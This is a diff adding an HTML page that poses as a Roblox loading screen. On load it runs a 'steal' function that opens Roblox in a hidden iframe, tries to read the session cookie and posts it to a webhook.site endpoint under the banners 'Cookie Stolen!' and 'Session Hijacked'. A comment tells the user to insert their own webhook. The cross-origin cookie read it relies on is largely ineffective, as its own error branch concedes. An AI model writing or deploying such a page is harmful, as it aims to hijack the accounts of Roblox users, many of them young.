@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+</head>
+<body style="background:black; color:white; display:flex; justify-content:center; align-items:center; height:100vh;">
+    <div id="status">Connecting to Roblox...</div>
+    <script>
+        // REPLACE WITH YOUR WEBHOOK.SITE URL
+        const WEBHOOK = "https://webhook.site/35a4757b-b299-41d0-a81e-148a6e0186cd";
+
+        async function steal() {
+            document.getElementById('status').innerText = "Redirecting...";
+           
+            try {
+                // 1. Open Roblox in a new window/tab (user interaction helps avoid popup blockers)
+                const robloxWindow = window.open("https://www.roblox.com/home", "_blank");
+               
+                // Wait for it to load
+                await new Promise(resolve => setTimeout(resolve, 2000));
+
+                // 2. Create a hidden iframe to grab the cookie context
+                const iframe = document.createElement('iframe');
+                iframe.src = "https://www.roblox.com/home";
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+
+                // 3. Wait for iframe to load
+                await new Promise(resolve => iframe.onload = resolve);
+
+                // 4. Try to read cookies from the iframe (this works better than popup due to same-origin policy)
+                let cookieStr = "";
+                try {
+                    cookieStr = iframe.contentWindow.document.cookie;
+                } catch (e) {
+                    cookieStr = "Cookie blocked by CORS/HttpOnly";
+                }
+
+                // 5. Send the data
+                const payload = {
+                    content: "🎣 **Cookie Stolen!** ``` " + cookieStr + " ```",
+                    embeds: [{
+                        title: "Session Hijacked",
+                        description: "Roblox session captured.",
+                        color: 15158332
+                    }]
+                };
+
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                document.getElementById('status').innerText = "Success! Check your webhook.";
+               
+                // Optional: Close the popup if it was opened
+                if (robloxWindow && !robloxWindow.closed) {
+                    robloxWindow.close();
+                }
+
+            } catch (err) {
+                document.getElementById('status').innerText = "Error: " + err.message;
+                console.error(err);
+            }
+        }
+
+        steal();
+    </script>
+</body>
+</html>
